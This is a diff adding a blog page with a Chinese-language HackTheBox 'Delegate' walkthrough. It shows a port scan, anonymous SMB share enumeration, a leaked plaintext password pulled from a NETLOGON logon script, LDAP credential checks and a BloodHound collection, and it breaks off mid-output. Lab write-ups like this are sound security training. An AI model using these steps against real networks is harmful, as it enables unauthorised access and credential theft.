@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前期信息收集\r初期分析\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat hostname 10.129.234.69 DC1.delegate.vl delegate.vl DC1 ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ echo domain=delegate.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ echo FQDN=DC1.delegate.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat start.sh ip=10.129.234.69 domain=delegate.vl FQDN=DC1.delegate.vl ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ . start.sh 端口扫描,判断为纯正dc\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat rustscan.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- With RustScan, I scan ports so fast, even my firewall gets whiplash 💨 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.69:53 Open 10.129.234.69:88 Open 10.129.234.69:135 Open 10.129.234.69:139 Open 10.129.234.69:389 Open 10.129.234.69:445 Open 10.129.234.69:464 Open 10.129.234.69:593 Open 10.129.234.69:636 Open 10.129.234.69:3269 Open 10.129.234.69:3268 Open 10.129.234.69:3389 Open 10.129.234.69:5985 Open 10.129.234.69:9389 入口\r存在匿名share\n">
+<title>Delegate-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/delegate/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="Delegate-wp">
+<meta property='og:description' content="前期信息收集\r初期分析\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat hostname 10.129.234.69 DC1.delegate.vl delegate.vl DC1 ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ echo domain=delegate.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ echo FQDN=DC1.delegate.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat start.sh ip=10.129.234.69 domain=delegate.vl FQDN=DC1.delegate.vl ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ . start.sh 端口扫描,判断为纯正dc\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat rustscan.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- With RustScan, I scan ports so fast, even my firewall gets whiplash 💨 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.69:53 Open 10.129.234.69:88 Open 10.129.234.69:135 Open 10.129.234.69:139 Open 10.129.234.69:389 Open 10.129.234.69:445 Open 10.129.234.69:464 Open 10.129.234.69:593 Open 10.129.234.69:636 Open 10.129.234.69:3269 Open 10.129.234.69:3268 Open 10.129.234.69:3389 Open 10.129.234.69:5985 Open 10.129.234.69:9389 入口\r存在匿名share\n">
+<meta property='og:url' content='http://localhost:1313/post/delegate/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='靶机' /><meta property='article:tag' content='htb' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-09-22T12:28:33&#43;08:00'/><meta property='article:modified_time' content='2025-09-22T12:28:33&#43;08:00'/>
+<meta name="twitter:title" content="Delegate-wp">
+<meta name="twitter:description" content="前期信息收集\r初期分析\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat hostname 10.129.234.69 DC1.delegate.vl delegate.vl DC1 ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ echo domain=delegate.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ echo FQDN=DC1.delegate.vl&gt;&gt;start.sh ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat start.sh ip=10.129.234.69 domain=delegate.vl FQDN=DC1.delegate.vl ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ . start.sh 端口扫描,判断为纯正dc\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/Delegate] └─$ cat rustscan.txt .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- With RustScan, I scan ports so fast, even my firewall gets whiplash 💨 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.69:53 Open 10.129.234.69:88 Open 10.129.234.69:135 Open 10.129.234.69:139 Open 10.129.234.69:389 Open 10.129.234.69:445 Open 10.129.234.69:464 Open 10.129.234.69:593 Open 10.129.234.69:636 Open 10.129.234.69:3269 Open 10.129.234.69:3268 Open 10.129.234.69:3389 Open 10.129.234.69:5985 Open 10.129.234.69:9389 入口\r存在匿名share\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期信息收集">前期信息收集</a></li>
+    <li><a href="#入口">入口</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%A2%98%E7%9B%AEwp/" >
+                题目wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/delegate/">Delegate-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 22, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    9 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前期信息收集">前期信息收集
+</h2><p>初期分析</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hostname 
+</span></span><span style="display:flex;"><span>10.129.234.69     DC1.delegate.vl delegate.vl DC1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo domain<span style="color:#f92672">=</span>delegate.vl&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo FQDN<span style="color:#f92672">=</span>DC1.delegate.vl&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat start.sh 
+</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>10.129.234.69
+</span></span><span style="display:flex;"><span>domain<span style="color:#f92672">=</span>delegate.vl
+</span></span><span style="display:flex;"><span>FQDN<span style="color:#f92672">=</span>DC1.delegate.vl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span></code></pre></div><p>端口扫描,判断为纯正dc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rustscan.txt 
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">With RustScan, I scan ports so fast, even my firewall gets whiplash 💨
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style="color:#e6db74">&#39;--ulimit 5000&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:53
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:88
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:135
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:139
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:389
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:445
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:464
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:593
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:636
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:3269
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:3268
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:3389
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:5985
+</span></span><span style="display:flex;"><span>Open 10.129.234.69:9389
+</span></span></code></pre></div><h2 id="入口">入口
+</h2><p>存在匿名share</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb <span style="color:#e6db74">&#34;</span>$ip<span style="color:#e6db74">&#34;</span> -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domin:delegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> delegate.vl<span style="color:#ae81ff">\g</span>uest:
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              NETLOGON        READ            Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.129.234.69   <span style="color:#ae81ff">445</span>    DC1              SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>查看非初始目录NETLOGON，发现敏感脚本泄露了凭证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //$ip/NETLOGON -N
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Aug <span style="color:#ae81ff">26</span> 08:45:24 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Aug <span style="color:#ae81ff">26</span> 05:45:45 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>  users.bat                           A      <span style="color:#ae81ff">159</span>  Sat Aug <span style="color:#ae81ff">26</span> 08:54:29 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">4652287</span> blocks of size 4096. <span style="color:#ae81ff">984341</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get users.bat 
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\u</span>sers.bat of size <span style="color:#ae81ff">159</span> as users.bat <span style="color:#f92672">(</span>0.4 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.4 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.bat 
+</span></span><span style="display:flex;"><span>rem @echo off
+</span></span><span style="display:flex;"><span>net use * /delete /y
+</span></span><span style="display:flex;"><span>net use v: <span style="color:#ae81ff">\\</span>dc1<span style="color:#ae81ff">\d</span>evelopment 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> %USERNAME%<span style="color:#f92672">==</span>A.Briggs net use h: <span style="color:#ae81ff">\\</span>fileserver<span style="color:#ae81ff">\b</span>ackups /user:Administrator P4ssw0rd1#123
+</span></span></code></pre></div><p>凭证权限正确，抓取猎犬</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo user<span style="color:#f92672">=</span>A.Briggs&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;P4ssw0rd1#123&#39;</span>&gt;&gt;start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ . start.sh 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u $user -p $pass
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.69   <span style="color:#ae81ff">389</span>    DC1              <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:delegate.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.69   <span style="color:#ae81ff">389</span>    DC1              <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> delegate.vl<span style="color:#ae81ff">\A</span>.Briggs:P4ssw0rd1#123
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/Delegate<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: delegate.vl
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span style="color:#f92672">[</span>Errno Connection error <span style="color:#f92672">(</span>dc1.delegate.vl:88<span style="color:#f92672">)]</span> <span style="color:#f92672">[</span>Errno -2<span style="color:#f92672">]</span> Name or service not known
